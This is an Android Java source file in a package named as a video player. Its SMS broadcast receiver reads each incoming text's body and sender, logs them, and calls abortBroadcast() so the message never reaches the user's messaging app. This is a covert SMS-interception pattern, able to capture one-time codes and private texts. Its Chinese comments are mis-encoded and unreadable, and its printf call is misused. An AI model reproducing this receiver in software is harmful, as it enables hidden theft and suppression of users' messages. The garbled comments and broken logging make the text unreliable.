package com.example.videoplayer;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import android.widget.Toast;

public class SmsReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		Toast.makeText(context, "���µĶ�������...", Toast.LENGTH_SHORT).show();
		Object[] pdus = (Object[]) intent.getExtras().get("pdus");
		for (Object obj : pdus) {
			SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) obj);
//			��ȡ���ŵ�����
			String body = smsMessage.getMessageBody();
//			��ȡ���ŵķ�����
			String sender = smsMessage.getOriginatingAddress();
			System.out.printf("TAG", "�����յ��ˡ�����"+"sender:"+sender+";body="+body);
			
			
//			������Ϳ���ͨ��get����post�������ύ����������
			
//			���ض���
			abortBroadcast();
		}
	}

}
